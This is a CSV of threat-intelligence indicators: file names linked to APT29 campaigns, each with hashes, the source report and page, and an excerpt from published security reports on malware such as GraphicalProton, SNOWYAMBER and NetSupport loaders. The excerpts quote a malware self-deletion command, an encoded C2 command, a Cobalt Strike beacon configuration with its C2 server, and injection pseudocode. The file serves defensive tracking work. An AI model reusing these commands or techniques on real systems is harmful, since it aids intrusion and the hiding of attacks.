1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:780edf014eb3d8745c2e464792c75455685297af152bc9826944ae8b26dc6e77,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 28}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 31. VictimTotal Sandbox testing a given sample compiled for the US targets Figure 32. VictimTotal Sandbox testing a given sample compiled for EU targets If the uploaded file gets a different detection result, the website notifies the logged-in user. This feature indicates that SilverFish group members are tracking the detection rate of their payloads in real time. The PTI Team also noticed two payloads uploaded to the file detection sandbox panel, one of whi",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:5630e49970b7e44916012c7160e0284c0831ad7da60fd3f64e5cd0e77511df91,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:91ba7141503f439101b311ba73836b6674f4d76b18ad0ae98f7a8996489235bc,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:48c2d45aff195c294cd62afb8e07d9f7c0bcbcfe49fd29623cf0b749faf3da6a,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 34}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 4.2 Affected Countries and Sectors As also explained in the Section 3.4 of this report, the PTI Team believes that the SilverFish campaign was operating in a ”region-specific” fashion, as the PTI Team has witnessed specific malware builds such as build_eu.ps1 and buildus9_3.ps1. In accordance with these findings, we can see that the overall attack target tends to be very similar between the US and the EU. While the US is by far the most frequently-targeted region w",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:e44d35b50bc2d3e647d7f670a87761197ed3ae317c3d5ece0e6dbfcbaa69d59c,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 8}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Advanced Post Exploitation Skillset : Executed commands and specially crafted scripts used by the SilverFish group strongly indicates sophistication and an advanced post-exploitation skillset. There are multiple attempts for pivoting to internal systems on critical infrastructure after the initial domain enumeration of victims. Exclusively Targeting Critical Infrastructures in the US and EU :Following a detailed inspection on the C&C panel, PTI Team has seen that t",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:919d13ed1a0ca4aef108cc59cb9bf37494c0f3c058d899f63baebc22a96e5729,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 28}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 31. VictimTotal Sandbox testing a given sample compiled for the US targets Figure 32. VictimTotal Sandbox testing a given sample compiled for EU targets If the uploaded file gets a different detection result, the website notifies the logged-in user. This feature indicates that SilverFish group members are tracking the detection rate of their payloads in real time. The PTI Team also noticed two payloads uploaded to the file detection sandbox panel, one of whi",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:4a221e97d0305c67220064cc3eef45aa41748fe30d5627538728a5ed921fee89,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:670a24fc7fa83d02ac45360f89e655233ae5ff5c811bc45c0fc35e0043910466,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:00402ea6d22a19c5412247376b21b7acf6d7b4d9b8dedc1db1f2de4adcb07994,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 34}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 4.2 Affected Countries and Sectors As also explained in the Section 3.4 of this report, the PTI Team believes that the SilverFish campaign was operating in a ”region-specific” fashion, as the PTI Team has witnessed specific malware builds such as build_eu.ps1 and buildus9_3.ps1. In accordance with these findings, we can see that the overall attack target tends to be very similar between the US and the EU. While the US is by far the most frequently-targeted region w",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:2b32392e33fb9c2f7e145b25e7bf919d5e740a8ea2e26557f9d0fc4d96a57305,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 8}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Advanced Post Exploitation Skillset : Executed commands and specially crafted scripts used by the SilverFish group strongly indicates sophistication and an advanced post-exploitation skillset. There are multiple attempts for pivoting to internal systems on critical infrastructure after the initial domain enumeration of victims. Exclusively Targeting Critical Infrastructures in the US and EU :Following a detailed inspection on the C&C panel, PTI Team has seen that t",
1.0.0,actor--apt29,artifact--sha256:03a5563d05b8298a697bcf073c297cc0cae8b23bdabca397cfd25ebb2251fcfb,observation--sha256:6627d21ad31a1f86f678b45d1821baacdb3823448d96d7d15c68d4e63a70e5c6,file-name,circl-analysisreport-miniduke-stage3-public.pdf,circl-analysisreport-miniduke-stage3-public.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 27 The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke “stage 1”, “stage 2”, and “stage 3” components as per Kaspersky’s original MiniDuke whitepaper. Additionally, a specific loader is often associated with the MiniDuke toolset and is referred to as the “MiniDuke loader”. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conju",
1.0.0,actor--apt29,artifact--sha256:ef75e5272b27c6743c6debea4b24569edb0289cc091dc56107580ca3b3d24e5a,observation--sha256:9d1fd9cffaf62b50c7ddb6fa8daa8247ee9e794227324b308f5f07e4fd26b0aa,file-name,client32.exe,client32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:1c734b61ffb1014697ff4696e7147c77cce34c2fb58bea49a056b79dbfe61d01,observation--sha256:0f7134922ac4fb120a3dc76dd5c6bc09df04d2551b523853005a66347c7e55c9,file-name,client32.ini,client32.ini,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:cdd154a1511a372d343b7f5f967b4ed30772c12c28ecf120125fe43ca299678b,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:7e54f963f9c8a94ab48cb326db6c5f1174d3fd002f04f676ad2c73aad85aa411,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 100}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5299 If Subkey 6 does not exist, the function returns a default value with the following fields: <iteration> : Value between 5 and 20 (depending on each sample) <id> : 0 <command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30 & del /F “%PROCESSOR_IDENTIFIER%” <EnvironmentVariableExpanded> : $(PROCESSOR_IDENTIFIER) <EnvironmentVariable> : PROCESSOR_IDENTFIER This command returns the Accept and User-Agent headers in the result. 3.4.3.4 GET HEADERS Illustration 94. GET HEAD",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:b38aa235eeec88cfb93ec825b3c98db3b26a916c550dca302cd989e282cbe0eb,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 108}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB52107 This command allows you to execute the following command: %SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH% The purpose of the command is to delete the executable from the disk as a means of concealment. It matches the default command and will be executed if the command includes the argument “-die.” 3.4.3. 10 KILL Illustration 101. KILL function If execution fails, the result will display an error “key_word”. payload",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:473e5c20800733524f1beafb008a3456647aa3532bfb6b7b9e89e92a6ade2c10,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 97}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"96Easter Bunny This command allows you to process a command sent from the C2 encoded in Base64. The encoded command will have a fixed structure so that it can be processed correctly: 3.4.3. 1 SEND COMMAND If we want it to be executed in iteration 2, we will encode the following in Base64: EXAMPLE OF USE 2 0 %SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME% $(COMPUTERNAME) COMPUTERNAME Finally, it will send the following command: :mnxqsq MgowCiVTWVNURU1ST09UJVxTeXN0ZW0",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:fec12431999eadea2c3e32fd661894299f4a212d034e441d44265b7c74b3dcf5,file-name,cmd.exe,cmd.exe,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:7b034fe7fcb6f3be9b68cced37f2e83b734eca1abc48b9d16f3f1f5749b85221,observation--sha256:7ce951945bd4b28845e504da1c3a5b2c5a05434a42151de2abe09f4abef06134,file-name,contact.php,contact.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,CYBERTHREATANALYSIS| RUSSIA AppendixA—IndicatorsofCompromise Compromised Domains Associated with BlueBravo Activity:te-as[.]noeasym6[.]comremcolours[.]comsimplesalsamix[.]comsylvio[.]com[.]brreidao[.]commightystake[.]comsharpledge[.]comfondoftravel[.]com URLs Associated with BlueBravo Activity:te-as[.]no/wine[.]phpeasym6[.]com/Information.phpreidao[.]com/dashboard.phpresetlocations[.]com/bmw.htmsimplesalsamix[.]com/e-yazi.htmlsylvio.com[.]br/form.phpmightystake[.]com/sponsorship.phpsharpledge[.],
1.0.0,actor--apt29,artifact--sha256:8b2a303e15fd864d4dd57a4e4bd895dd39579681743014d9472ba4230fdd1f99,observation--sha256:4ea45736cdddb38a47f8154698376f7194721906f29708a2e1a961354656f1d0,file-name,copies7za.exe,copies7za.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:a6e6ec4354b380e5dcc0e8e31d4f7ccae0dec811b94402fa57c75050ec87703f,observation--sha256:facb58f499df83035381f7667cd337ed49d2a79dd76f95698b4032ffaeca3bbb,file-name,cosmicduke_whitepaper.pdf,cosmicduke_whitepaper.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 37 BIBLIOGRAPHY 1. The White House; Remarks By President Barack Obama In Prague As Delivered; published 5 April 2009; [Online]. Available: https://www.whitehouse.gov/the-press-office/remarks-president-barack-obama-prague-delivered 2. Wikipedia; KavKaz Center; [Online]. Available: https://en.wikipedia.org/wiki/Kavkaz_Center 3. BBC: Nato exercises ‘a dangerous move’; published 17 April 2009; [Online]. Available: http://news.bbc.co.uk/2/hi/ europe/8004399.stm 4. ",
1.0.0,actor--apt29,artifact--sha256:a9cca91688e1c653739ec0163b889739533dbd58d29fb0495d37db674b36c0ab,observation--sha256:18d7635cc36676da8bdb9fc780269a563c4739dcead0360beaf3ec0a20124ca1,file-name,ctfmon.exe,ctfmon.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:e62876c0b6274e6abf6b694b2a9dbcb96f83433e331b6c826ad4ad794fa13427,observation--sha256:fd74f9f73498a0ac46c976f990f989e3b342f50ec3ff4f121421999cff18de9d,file-name,dllhost.exe,dllhost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/24 Payloads We have managed to collect two variants of payloads delivered via SNOWYAMBER: 1. CobaltStrike Beacon. Presented below is an extracted beacon configuration16: BeaconType - HTTPS Port - 443 SleepTime - 37000 MaxGetSize - 1048576 Jitter - 33 MaxDNS - Not Found PublicKey_MD5 - 92b602d1008704ef300d29ca014c6e21 C2Server - humanecosmetics.com,/category/noteworthy/6426- 7346-9789 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64",
1.0.0,actor--apt29,artifact--sha256:6a033d3ad3fd1a0722f98f13005771880f18722e8cda1ad68e0a331fab5e534e,observation--sha256:49790af3be17cbd9b5ba4faca451527f0461a20dfaa12fea0442cf1ae3482a3e,file-name,e-yazi.docx,e-yazi.docx,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,CYBERTHREATANALYSIS| RUSSIA 62a903a4b5cd27d739950e71ab74061e815af4830a29df6dcbf8c1a34abc87cb bmw8.png.lnk3a76182529c4fd5276091ed8ff4c4dcc89e4abc5981348a066c4eb34a9956947 bmw9.png.lnk38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534$Recycle.Bin/AppvIsvSubsystems64.dll706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7 $Recycle.Bin/MSVCP140.dlle3abb477f3230c94bfc97ec8f7cee8d4ad4a1fba16cda1f318cfa12780fd33f7$Recycle.Bin/Mso20Win32Client.DLLd0a3632404c5b4b224269ecedfbcdf2,
1.0.0,actor--apt29,artifact--sha256:61dd274f2935e8f9479ea65e723440509a25f5395bcc2384b53844f75dc19ec4,observation--sha256:12ccd1748fa5279f7c483bf0d2a26e4ed050b4e348edffe23925529d17366155,file-name,e-yazi.zip,e-yazi.zip,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure5  BlueBravolurethemedaroundautomobilesaleinKyiv Source: RecordedFuture) simplesalsamix[.]com OnMarch24, 2023, Insikt Groupidentifiedthedomainsimplesalsamix[.]com, hostedontheIP50.116.94 . 178, deliveringamaliciousZIPfile“e-yazi.zip”  SHA256 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839 viathewebpagee-yazi.html.  E-yazi translatestotheterm“e-mail” inTurkishandlikelyservesasanother characteristicof thebroader natureof thelureandintendedtarget o",
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:27c525952b2c25b1827fe320b4e89f2db94e2e446e42376349283d381eefc1f5,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:0da6f6ea58aac634c901e4c7ab5073236e6c61e88b4785ed7b2968931e219480,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 11/20 envsrv.dll Envsrv.dll is responsible for facilitating persistence via the Run registry key. Envsrv.dll has one export (named unify, ord #2). It closely follows a previously established pattern, reusing exactly the same code blocks. A simplified codeflow is presented on the listing below: 1. __int64 unify() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleepEmulation(); 7. Initialize",
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:592288a024a5f185b97ff041f27089e076de59aa8e722bcecd247b2faffa252b,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 17/20 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca75439,
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:ae6bb52b7f433947b106a65031d84efc723110a4aeede47352b5e3da73d9fc84,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 2/20 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:23006b251357e083ddea89d46c5cd9363b5814ac9e58e5fe17e9495ba5ffa704,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/11 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca754396,
1.0.0,actor--apt29,artifact--sha256:4411d82b46648be0cfe8e47c867c6db9589b399db9da253556613316bcf6e6e8,observation--sha256:5af6429c4462bef5b0b6b725342e55645cd41316d58c70c2e66d68a29ed69dbf,file-name,example.php,example.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 10}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group At this point, the PTI Team had enough details to create a fingerprint profile for the subject host and started scanning the entire global IPv4 range using PRODAFT’s rapid scanning and fingerprinting technology for hosts with similar characteristics. After 12 hours, the PTI Team identified more than 200 hosts with the similarities mentioned above. After filtering the false positive results, the PTI Team found a host with IP 81.4.122.203 which was an exact match (Se",
1.0.0,actor--apt29,artifact--sha256:4411d82b46648be0cfe8e47c867c6db9589b399db9da253556613316bcf6e6e8,observation--sha256:90c024480514a8b1bfe3e91e1dad3d3485d1e392b30dcbecc1d4687d5d03942a,file-name,example.php,example.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 9}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3 Technical Analysis This section contains the TTP analysis of the SilverFish threat group including the C&C infrastructure, traffic distribution system, post exploitation steps, and malware detection sandbox (we named it as VictimTotal Sandbox, see Section 3.4). Domain IP Address AS Name databasegalore.com 5.252.177 .21 MivoCloud SRL At the beginning of our investigation into the SolarWinds hack, the PTI Team started analyzing the IOC data released by FireEye[ 8].",
